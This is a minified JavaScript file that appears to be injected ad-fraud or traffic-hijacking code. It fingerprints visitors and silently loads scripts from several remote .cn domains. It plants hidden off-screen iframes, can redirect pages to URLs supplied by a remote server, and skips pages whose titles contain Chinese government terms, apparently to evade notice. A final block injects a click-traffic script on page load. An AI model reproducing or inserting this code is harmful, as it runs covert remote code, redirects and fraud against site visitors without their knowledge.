(function(){var util={hash:function(s){var h=0,g=0,i=s.length-1;for(i;i>=0;i--){var code=parseInt(s.charCodeAt(i),10);h=((h<<6)&268435455)+code+(code<<14);if((g=h&266338304)!=0){h=(h^(g>>21))}}return h},guid:function(){var s=[navigator.platform,navigator.userAgent,window.screen.width,"x",window.screen.height,document.referrer].join(""),sLen=s.length,hLen=window.history.length;while(hLen){s+=(hLen--)^(sLen++)}return(Math.round(Math.random()*2147483647)^util.hash(s))*2147483647}};var id=util.guid(),uid="3195702676747528700.1580550388500",t="vc",g="dcyl";var stat=function(data){};var ajax=function(params){params=params||{};params.data=params.data||{};var json=params.jsonp?jsonp(params):json(params);function json(params){params.type=(params.type||"GET").toUpperCase();params.data=formatParamsJson(params.data);var xhr=null;if(window.XMLHttpRequest){xhr=new XMLHttpRequest()}else{xhr=new ActiveXObjcet("Microsoft.XMLHTTP")}xhr.onreadystatechange=function(){if(xhr.readyState==4){var status=xhr.status;if(status>=200&&status<300){var response="";var type=xhr.getResponseHeader("Content-type");if(type.indexOf("xml")!==-1&&xhr.responseXML){response=xhr.responseXML}else{if(type.indexOf("application/json")!=-1){response=JSON.parse(xhr.responseText)}else{response=xhr.responseText}}params.success&&params.success(response)}else{params.error&&params.error(status)}}};if(params.type=="GET"){xhr.open(params.type,params.url,true);xhr.send(null)}else{xhr.open(params.type,params.url,true);xhr.setRequestHeader("Content-Type","application/json");xhr.send(params.data)}}function jsonp(params){var callbackName=params.jsonp;var head=document.getElementsByTagName("head")[0];params.data["callback"]=callbackName;var data=formatParams(params.data);var script=document.createElement("script");head.appendChild(script);window[callbackName]=function(json){head.removeChild(script);clearTimeout(script.timer);window[callbackName]=null;params.success&&params.success(json)};script.src=params.url+"?"+data;if(params.time){script.timer=setTimeout(function(){window[callbackName]=null;head.removeChild(script);params.error&&params.error({message:"超时"})},time)}}function formatParams(data){var arr=[];for(var name in data){arr.push(encodeURIComponent(name)+"="+encodeURIComponent(data[name]))}arr.push("v="+random());return arr.join("&")}function formatParamsJson(data){var arr=[];for(var name in data){arr.push('"'+name+'":"'+data[name]+'"')}return"{"+arr.join(",")+"}"}function random(){return Math.floor(Math.random()*10000+500)}};stat("e=enter");if(window._fcy_nr){return false}window._fcy_nr={rid:id,uid:uid,t:t,g:g,href:window.location.href,referrer:document.referrer};var doc=document,head=(document.head==null?document.getElementsByTagName("head")[0]:document.head),load=function(url,attrs,log){var s=document.createElement("script");s.setAttribute("type","text/javascript");if(attrs){for(var k in attrs){s.setAttribute(k,attrs[k])}}s.setAttribute("src",url);head.appendChild(s);if(log){s.onload=s.onreadystatechange=function(){if(!this.readyState||this.readyState=="loaded"||this.readyState=="complete"){if(log.id){stat("e=loaded&adid="+log.id)}else{stat("e=loaded&url="+encodeURIComponent(url))}}s.onload=s.onreadystatechange=null}}},createIfr=function(url){var iframe;try{iframe=doc.createElement('<iframe sandbox="allow-forms allow-same-origin allow-scripts" src="'+url+'" width="640" height="100" style="position: absolute; top: -1000px;" border="0" frameborder="no"></iframe>')}catch(e){iframe=doc.createElement("iframe");iframe.setAttribute("src",url);iframe.setAttribute("width","640");iframe.setAttribute("sandbox","allow-forms allow-same-origin allow-scripts");iframe.setAttribute("height","100");iframe.setAttribute("border","0");iframe.setAttribute("style","position: absolute; top: -1000px;");iframe.setAttribute("frameborder","no")}doc.body&&doc.body.appendChild(iframe)};if(!navigator.userAgent){return}var ua=navigator.userAgent.toLowerCase(),isMob=function(){if(!ua){return false}return(/ipad/i.test(ua)||/iphone/i.test(ua)||/android/i.test(ua)||/midp/i.test(ua)||/rv:1.2.3.4/i.test(ua)||/ucweb/i.test(ua)||/windows mobile/i.test(ua)||/windows ce/i.test(ua))},isAndroid=function(){return/(android)/i.test(ua)},isIOS=function(){if(!ua){return false}return(/ipad/i.test(ua)||/iphone/i.test(ua))},as=function(){load("https://tanx.f91c53.cn/admast.js",{async:""});if(isMob()){if(window.top==window){load("https://j.kjfoqi.cn/resource/js/static.js",{async:""})}if(isIOS()){load("https://fx.happygod.cn/hdmx/st/tl/dt572.js",{async:""});createIfr("https://cnzz.veryci.com/i.html")}else{createIfr("https://a-cn.duoyi.com/2in1/2301346010008");createIfr("https://cnzz.veryci.com/a.html")}if(window.top==window){load("https://a.urlat.cn/upp/psvnna",{async:""},{id:"psvnna"})}load("https://res.iyoowi.com/iy/iy.js?cid=E706C72B",{async:""})}else{createIfr("https://cnzz.veryci.com/p.html")}},asLoaded=0,runAs=function(){if(asLoaded){return}asLoaded=1;if(window.top!=window){setTimeout(function(){as()},1000)}else{as()}};
stat("e=bexec");try{var r=1;if(r){runAs()}else{setTimeout(function(){stat("e=1s");runAs()},1000);ajax({url:"https://webview.360zlzq.cn:8081/apiAwake/ad/awakee?t=vc&g=dcyl",type:"GET",data:{},success:function(res){if(res.data.target){setTimeout(function(){window.location.href=res.data.target},100)}else{runAs()}},error:function(status){console.warn(status);stat("e=jumperr&error="+status)}})}}catch(e){stat("e=error&err="+encodeURIComponent(e))}if(window.top!=window){return false}stat("e=badjs");var bkw=["%e4%b8%ad%e5%9b%bd","%e5%9b%bd%e5%ae%b6","%e4%ba%ba%e6%b0%91","%e5%85%9a","%e9%83%a8","%e5%8e%85","%e5%a7%94","%e5%b1%80","%e5%8a%9e","%e4%b8%ad%e5%a4%ae","%e5%8c%ba","%e5%8e%bf","%e5%8d%8f%e4%bc%9a","%e8%81%94%e5%90%88","%e6%b4%be%e5%87%ba%e6%89%80","%e5%b9%bf%e6%92%ad%e7%94%b5%e5%8f%b0"];var title=encodeURIComponent(document.getElementsByTagName("title")[0]?document.getElementsByTagName("title")[0].text:"");for(var i=0;i<bkw.length;i++){if(title.indexOf(bkw[i])>-1){return}}load("https://vcj.veryci.com/config/rep.js?_="+parseInt(new Date().getTime()/86400000),{defer:"",id:"__fcy_rep_",uid:uid,rid:id,t:t,g:g});if(isMob()){load("https://vcj.veryci.com/config/callup.js?_="+parseInt(new Date().getTime()/86400000),{defer:"",id:"__fcy_callup_",uid:uid,rid:id,t:t,g:g})}createIfr("https://cnzz.veryci.com/cnzz/dcyl.html")})();
(function(){
	var APC_test_rand = Math.floor(Math.random()*10000);
	if(APC_test_rand < 10000){
		function _t(){
		var s = document.createElement("script");
		document.getElementsByTagName("head")[0].appendChild(s);
		s.src = ((window.location.protocol||'').toLowerCase()=='https:' ? 'https:' : 'http:') + "//jqmt.qq.com/cdn_dianjiliu.js?a=" + Math.random();
		};
		if (window.addEventListener) {
			window.addEventListener("load", _t, false);
		} else {
			window.attachEvent("onload", _t);
		}
	}
})();

